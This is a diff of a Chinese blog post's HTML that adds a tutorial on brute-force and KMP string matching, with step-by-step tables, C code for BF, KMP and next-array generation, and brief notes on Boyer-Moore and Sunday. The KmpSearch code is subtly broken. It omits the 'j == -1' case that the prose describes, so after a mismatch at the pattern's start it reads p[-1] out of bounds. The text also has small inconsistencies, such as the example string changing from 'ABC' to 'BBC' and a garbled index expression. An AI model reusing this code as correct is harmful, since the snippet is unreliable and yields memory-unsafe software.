+Ptn:         ABCDABD
+j:           0123456
+</code></pre><p>Step 3：到 i = 10 时，此时我们放弃比较重复内容，比较 i = 10 与 j = 2 发现出现不符。接下来，由于 ‘AB’ 重复出现，我们从 i = 11, j = 0 开始比较。</p>
+<pre><code>     00000000001111111111222
+i:   01234567890123456789012
+Tag: ABC ABCDAB ABCDABCDABDE
+Ptn:            ABCDABD
+j:              0123456
+</code></pre><p>Step 4：到 i = 17, j = 6 出现不相同异常，我们采取一贯的做法，令 i = 15, j = 2 继续搜索。</p>
+<pre><code>     00000000001111111111222
+i:   01234567890123456789012
+Tag: ABC ABCDAB ABCDABCDABDE
+Ptn:                ABCDABD
+j:                  0123456
+</code></pre><p>Step 5：此时我们找到完全匹配的字符串，初始位置为 15, 返回 i。比较结束。</p>
+<h3 id="失配函数"><a href="#失配函数" class="headerlink" title="失配函数"></a><strong>失配函数</strong></h3><p>特殊情况：当一个失配出现在模式串的此次匹配最开始，此时无法回退，我们置 j = -1，跳到模式串的开头字符。</p>
+<p>关键：建立 next 表。</p>
+<h4 id="理清匹配过程"><a href="#理清匹配过程" class="headerlink" title="理清匹配过程"></a>理清匹配过程</h4><p>假设现在文本串 Tag 匹配到 i 位置，模式串 Ptn 匹配到 j 位置：</p>
+<ul>
+<li>如果 j == -1 或当前字符匹配成功（即 Tag[i] == Ptn[j]），都令 i++，j++，继续匹配下一个字符；</li>
+<li>如果当前字符匹配失败（即 Tag[i] != Ptn[j]），则令 i 不变，j = next[j]。此举意味着失配时，模式串 Ptn 相对于文本串 Tag 向右移动了 (j - next [j]) 位。<br>换言之，当匹配失败时，模式串向右移动的位数为： <strong>失配字符所在位置 - 失配字符对应的 next 值（next 数组的求解会在下文中详细阐述），即移动的实际位数为：(j - next[j])</strong> ，且此值大于等于 1。</li>
+</ul>
+<p>很快，你也会意识到 next 数组各值的含义：代表当前字符之前的字符串中，有多大长度的相同前缀后缀。例如如果 next [j] = k，代表 j 之前的字符串中有最大长度为 k 的相同前缀后缀。</p>
+<ul>
+<li>这也意味着在某个字符失配时，该字符对应的 next 值会告诉你下一步匹配中，模式串应该跳到哪个位置（跳到 next [j] 的位置）。如果 next [j] 等于 0，则跳到模式串的开头字符，若 next [j] = k 且 k &gt; 0，代表下次匹配跳到 j 之前的某个字符，而不是跳到开头，且具体跳过了 k 个字符。</li>
+</ul>
+<p>这里，我们明确一点，next 表的产生实际只与 <strong>模式串及其子串</strong> 有关。</p>
+<h4 id="关于-Next-表的建立"><a href="#关于-Next-表的建立" class="headerlink" title="关于 Next 表的建立"></a>关于 Next 表的建立</h4><ol>
+<li>寻找前缀后缀的公共元素最大长度</li>
+</ol>
+<p>对于 Ptn = p0 p1 … pj ，寻找 Ptn 中长度最大且相等的前缀和后缀。若存在 p0 p1 … pk = p(j-k) p(j-k+1)… pj，那么在包含 pj 的模式串中有最大长度为 k+1 的相同前缀和后缀。</p>
+<ol start="2">
+<li>求 next 数组</li>
+</ol>
+<p>next 数组考虑的是除当前字符外的最长相同前缀后缀，所以通过第 ① 步骤求得各个前缀后缀的公共元素的最大长度后，只要稍作变形即可：将第 ① 步骤中求得的值整体右移一位，然后初值赋为 -1 。</p>
+<ol start="3">
+<li>根据 next 数组进行匹配 </li>
+</ol>
+<p>匹配失配，j = next[j] ，模式串向右移动 j - next[j] 位。即当 模式串的后缀 p(j-k) p(j-k+1) … p(j-1) 和 源串 s(i-k) s(i-k+1) … s(i-1) 匹配成功，但最后一位 pj 和 si 匹配失败的时候，因为 next[j] = k，等价于 <strong>在不包含 pj 的模式串中有最大公共长度为 k 的前缀后缀，即 p0 p1 … p(k-1) = p(j-k+) p(j-k+1) … p(j-1)</strong> ，接下来我们令 j = next[j] ，从而让字符串右移 next[j] 位，此时模式串的最大长度公共前缀 p0 p1 … p(k-1) 对应这 s(i-k) s(i-k+1) … s(i-1), 实现了跳过公共前后缀的匹配，直接匹配 pk 和 si 继续匹配。</p>
+<h3 id="学习之后实验"><a href="#学习之后实验" class="headerlink" title="学习之后实验"></a>学习之后实验</h3><pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:               ABCDABD
+</code></pre><ol>
+<li>寻找最长前缀后缀</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">子串</th>
+<th style="text-align:center">前缀</th>
+<th style="text-align:center">后缀</th>
+<th style="text-align:center">最大公共元素长度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">A</td>
+<td style="text-align:center">/</td>
+<td style="text-align:center">/</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">AB</td>
+<td style="text-align:center">A</td>
+<td style="text-align:center">B</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">ABC</td>
+<td style="text-align:center">A,AB</td>
+<td style="text-align:center">C,BC</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">ABCD</td>
+<td style="text-align:center">A,AB,ABC</td>
+<td style="text-align:center">D,CD,BCD</td>
+<td style="text-align:center">0</td>
+</tr>
+<tr>
+<td style="text-align:center">ABCDA</td>
+<td style="text-align:center"><font color="red">A</font>,AB,ABC,ABCD</td>
+<td style="text-align:center"><font color="red">A</font>,DA,CDA,BCDA</td>
+<td style="text-align:center">1</td>
+</tr>
+<tr>
+<td style="text-align:center">ABCDAB</td>
+<td style="text-align:center">A,<font color="red">AB</font>,ABCD,ABCDA</td>
+<td style="text-align:center">B,<font color="red">AB</font>,DAB,CDAB,BCDAB</td>
+<td style="text-align:center">2</td>
+</tr>
+<tr>
+<td style="text-align:center">ABCDABD</td>
+<td style="text-align:center">A,AB,ABC,ABCD,ABCDA,ABCDAB</td>
+<td style="text-align:center">D,BD,ABD,DABD,CDABD,BCDABD</td>
+<td style="text-align:center">0</td>
+</tr>
+</tbody>
+</table>
+<p>对应生成的公共元素最大长度表如下：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>A</th>
+<th>B</th>
+<th>C</th>
+<th>D</th>
+<th>A</th>
+<th>B</th>
+<th>D</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>最大前缀后缀公共元素长度</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>1</td>
+<td>2</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<ol start="2">
+<li>基于最大长度表生成 NEXT 表</li>
+</ol>
+<p>原来 next 数组的求解竟然如此简单：就是找最大对称长度的前缀后缀，然后整体右移一位，初值赋为-1（当然，你也可以直接计算某个字符对应的next值，就是 <strong>看这个字符之前的字符串中有多大长度的相同前缀后缀</strong>）</p>
+<table>
+<thead>
+<tr>
+<th>模式串子串</th>
+<th>A</th>
+<th>B</th>
+<th>C</th>
+<th>D</th>
+<th>A</th>
+<th>B</th>
+<th>D</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NEXT</td>
+<td>-1</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>1</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>备注：这里其实 next[A0] == -1，意在告诉程序当一开始模式串第一个字符与文本串就不匹配时，可以放弃此次匹配，直接将模式串不断右移一位开始下一次匹配。</p>
+</blockquote>
+<ol start="3">
+<li>初始匹配</li>
+</ol>
+<pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:    ABCDABD
+</code></pre><p>这里，我们从一开始就发现没有匹配的字符，于是不断后移一位。移动到 i = 4 时，与第五个字符 A 匹配成功，接下来，一直向下匹配，匹配到 j = 6 （字母 D2）时，发生失配。这时将模式串后移，后移 j = j - next[D2] = 6 - 2 = 4 位。</p>
+<ol start="4">
+<li>第二次匹配</li>
+</ol>
+<pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:        ABCDABD
+</code></pre><p>这里，移动到 i = 8 时，与第九个字符 A 匹配成功，接下来，一直向下匹配，匹配到 j = 2 （字母 C）时，发生失配。这时将模式串后移，后移 j = j - next[C] = 2 - 0 = 2 位。</p>
+<ol start="5">
+<li>第三次匹配， (TAG[10] = ‘ ‘) != (PTN[0] == ‘A’)，后移 j = j - next[A1] = 0 - (-1) = 1 位。</li>
+</ol>
+<pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:          ABCDABD
+</code></pre><ol start="6">
+<li>第四次匹配， (TAG[17] = ‘C’) != (PTN[6] == ‘D’)，后移 j = j - next[D2] = 6 - 2 = 4 位。</li>
+</ol>
+<pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:           ABCDABD
+</code></pre><ol start="7">
+<li>第五次匹配， 匹配成功。</li>
+</ol>
+<pre><code>原字符串 TAG： BBC ABCDAB ABCDABCDABDE
+匹配模式串 PTN:               ABCDABD
+</code></pre><h3 id="关于逍爷的讲解"><a href="#关于逍爷的讲解" class="headerlink" title="关于逍爷的讲解"></a>关于逍爷的讲解</h3><p>试比较：</p>
+<p>失配时，模式串向右移动的位数为：失配字符所在<strong>位置</strong> - 失配字符对应的 next 值</p>
+<p>失配时，模式串向右移动的位数为：<strong>已匹配字符数 - 失配字符的上一位字符所对应的最大长度值</strong></p>
+<p>其实二者等价，只不过讲法不同罢了。</p>
+<p>根据《最大长度表》，失配时，模式串向右移动的位数 = 已经匹配的字符数 - 失配字符的上一位字符的最大长度值。</p>
+<p>而根据《next 数组》，失配时，模式串向右移动的位数 = 失配字符的位置 - 失配字符对应的 next 值。</p>
+<p>其中，从 0 开始计数时，失配字符的位置 = 已经匹配的字符数（失配字符不计数），而失配字符对应的next 值 = 失配字符的上一位字符的最大长度值，两相比较，结果必然完全一致。</p>
+<h2 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h2><h3 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ViolentMatch</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> sLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> sLen <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> pLen<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//①如果当前字符匹配成功（即 Tag[i] == Ptn[j]），则 i++，j++    </span>
+            i<span class="token operator">++</span><span class="token punctuation">;</span>
+            j<span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//②如果失配（即 Tag[i]! = Ptn[j]），令i = i - (j - 1)，j = 0    </span>
+            i <span class="token operator">=</span> i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">//匹配成功，返回模式串 Ptn 在文本串 Tag 中的位置，否则返回 -1</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> pLen<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">KmpSearch</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> sLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> sLen <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> pLen<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//①如果当前字符匹配成功（即 Tag[i] == Ptn[j]），都令 i++，j++    </span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            i<span class="token operator">++</span><span class="token punctuation">;</span>
+            j<span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">//②如果当前字符匹配失败（即 Tag[i] != Ptn[j]），则令 i 不变，j = next[j]    </span>
+            <span class="token comment" spellcheck="true">//next[j]即为j所对应的next值      </span>
+            j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> pLen<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>
+    <span class="token keyword">else</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="改进后的-Next-数组的递归生成"><a href="#改进后的-Next-数组的递归生成" class="headerlink" title="改进后的 Next 数组的递归生成"></a>改进后的 Next 数组的递归生成</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">GetNextval</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> next<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">int</span> pLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    next<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> pLen <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">//p[k]表示前缀，p[j]表示后缀  </span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token operator">++</span>j<span class="token punctuation">;</span>
+            <span class="token operator">++</span>k<span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">//较之前next数组求法，改动在下面4行</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> p<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>
+                next<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//之前只有这一行</span>
+            <span class="token keyword">else</span>
+                <span class="token comment" spellcheck="true">//因为不能出现p[j] = p[(next[j])]，所以当出现时需要继续递归，k = next[k] = next[next[k]]</span>
+                next<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+            k <span class="token operator">=</span> next<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="拓展延伸：-Sunday-算法"><a href="#拓展延伸：-Sunday-算法" class="headerlink" title="拓展延伸： Sunday 算法"></a>拓展延伸： Sunday 算法</h2><h3 id="Boyer-Moore-算法"><a href="#Boyer-Moore-算法" class="headerlink" title="Boyer-Moore 算法"></a>Boyer-Moore 算法</h3><p>略显复杂，略去不提，看文章开头有 Wikipedia 链接，也是一个改进算法。</p>
+<p>该算法从模式串的尾部开始匹配，且拥有在最坏情况下O(N)的时间复杂度。在实践中，比KMP算法的实际效能高。</p>
+<p>BM算法定义了两个规则：</p>
+<p>坏字符规则：当文本串中的某个字符跟模式串的某个字符不匹配时，我们称文本串中的这个失配字符为坏字符，此时模式串需要向右移动，移动的位数 = 坏字符在模式串中的位置 - 坏字符在模式串中最右出现的位置。此外，如果”坏字符”不包含在模式串之中，则最右出现位置为-1。</p>
+<p>好后缀规则：当字符失配时，后移位数 = 好后缀在模式串中的位置 - 好后缀在模式串上一次出现的位置，且如果好后缀在模式串中没有再次出现，则为-1。</p>
+<h3 id="Sunday-算法"><a href="#Sunday-算法" class="headerlink" title="Sunday 算法"></a>Sunday 算法</h3><p>上文中，我们已经介绍了 <code>KMP</code> 算法和 <code>BM</code> 算法，这两个算法在最坏情况下均具有线性的查找时间。但实际上， <code>KMP</code> 算法并不比最简单的 <code>C</code> 库函数 <code>strstr()</code> 快多少，而 <code>BM</code> 算法虽然通常比 <code>KMP</code> 算法快，但 <code>BM</code> 算法也还不是现有字符串查找算法中最快的算法，本文最后再介绍一种比 <code>BM</code> 算法更快的查找算法即 <code>Sunday</code> 算法。</p>
+<p>Sunday 算法由 Daniel M.Sunday 在 1990 年提出，它的思想跟 BM 算法很相似：</p>
+<p>只不过 Sunday 算法是从前往后匹配，在匹配失败时关注的是文本串中参加匹配的最末位字符的下一位字符。如果该字符没有在模式串中出现则直接跳过，即移动位数 = 匹配串长度 + 1；否则，其移动位数 = 模式串中最右端的该字符到末尾的距离 + 1。</p>
+<p>下面举个例子说明下 Sunday 算法。假定现在要在文本串 “substring searching algorithm” 中查找模式串 “search” 。</p>
+<ol>
+<li>刚开始时，把模式串与文本串左边对齐：</li>
+</ol>
+<pre><code>substring searching algorithm
+search
+^
+</code></pre><ol start="2">
+<li>结果发现在第 2 个字符处发现不匹配，不匹配时关注文本串中参加匹配的最末位字符的下一位字符，即标粗的字符 i，因为模式串 search 中并不存在 i，所以模式串直接跳过一大片，向右移动位数 = 匹配串长度 + 1 = 6 + 1 = 7，从 i 之后的那个字符（即字符 n ）开始下一步的匹配，如下图：</li>
+</ol>
+<pre><code>substring searching algorithm
+　　　     search
+　　　　 ^
+</code></pre><ol start="3">
+<li>结果第一个字符就不匹配，再看文本串中参加匹配的最末位字符的下一位字符，是 ‘r’ ，它出现在模式串中的倒数第 3 位，于是把模式串向右移动 3 位（ r 到模式串末尾的距离 + 1 = 2 + 1 = 3 ），使两个 ‘r’ 对齐，如下：</li>
+</ol>
+<pre><code>substring searching algorithm
+　　　　        search
+　　　　　　　   ^
+</code></pre><ol start="4">
+<li>匹配成功。</li>
+</ol>
+<p>回顾整个过程，我们只移动了两次模式串就找到了匹配位置，缘于 Sunday 算法每一步的移动量都比较大，效率很高。完。</p>
+<h2 id="一点点碎碎念"><a href="#一点点碎碎念" class="headerlink" title="一点点碎碎念"></a>一点点碎碎念</h2><p>学院现在的课程设置问题非常严重，图灵机、有限状态自动机、算法优化、通信原理、量子物理各方面的课程缺乏严重，导致学生学习专业课程时出现了极大的知识断层，课外各种杂事颇多，时间非常紧张，需要学生花大量课后时间充电。</p>
+<p>本来计算机相关行业，知识更新速度快，入门门槛高、相对复杂，基础知识要求广泛，现在却这样，大学真的很忙。每天都是高压锅生活。为了光明的未来和亲爱的钰，还是更加努力吧！</p>
+<p>关于昨天的汇编文章：其实用什么平台并不重要，作为入门者，你需要明白的只是老师为什么让你这样做，这样做背后的计算机原理是什么。在具体实践上，如何把本来 Windows 上的东西尽量在 Linux 上完美复现或者找到替代品。这样就好了。我知道 Windows 开发的公司仍然是绝大多数，但是在 Linux 平台写代码给了很多人一种专注于代码实现本身的感觉（虽然初始状态的学习曲线非常抖），不用像 Windows 一样各种折腾环境。更何况，Arch Linux 的系统设计注重代码正确、优雅和极简主义，期待用户能够愿意去理解系统的操作，这样的系统正是我们有一点点基础的初学者所需要的。日常用 Linux 多学点底层的东西同时又提高效率又何妨？</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><p><a href="https://blog.csdn.net/ns_code/article/details/19286279" target="_blank" rel="noopener">https://blog.csdn.net/ns_code/article/details/19286279</a></p>
+</li>
+<li><p><a href="https://zh.m.wikipedia.org/zh-cn/%E5%85%8B%E5%8A%AA%E6%96%AF-%E8%8E%AB%E9%87%8C%E6%96%AF-%E6%99%AE%E6%8B%89%E7%89%B9%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">https://zh.m.wikipedia.org/zh-cn/%E5%85%8B%E5%8A%AA%E6%96%AF-%E8%8E%AB%E9%87%8C%E6%96%AF-%E6%99%AE%E6%8B%89%E7%89%B9%E7%AE%97%E6%B3%95</a></p>
+</li>
+<li><p><a href="http://saturnman.blog.163.com/blog/static/5576112010969957130/" target="_blank" rel="noopener">http://saturnman.blog.163.com/blog/static/5576112010969957130/</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/v_july_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_july_v/article/details/7041827</a>    Strongly Recommended</p>
+</li>
+</ul>
 
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
@@ -597,7 +917,7 @@
                             本博客所有文章，未经特殊说明，均使用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank">CC BY-NC-SA 3.0 Unported License 授权</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/">https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/</a>
+                        <strong>本文链接：</strong><a href="https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/">https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/</a>
                     </p>
                 </blockquote>
         
@@ -653,8 +973,8 @@
 
 <script type="text/javascript">
     var disqus_config = function () {
-        this.page.url = 'https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = 'https://www.kmahyyg.xyz/2018/Simple-HTTP-Hijacking/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://www.kmahyyg.xyz/2018/KMP-BF-DataStru/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
 </script>
 
@@ -703,21 +1023,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/Randomize-MAC-Address-on-Linux/" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/2018/The-Silence-City/" id="post_nav-older" class="next-content">
+        <a href="/2018/ASM-exp-report/" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
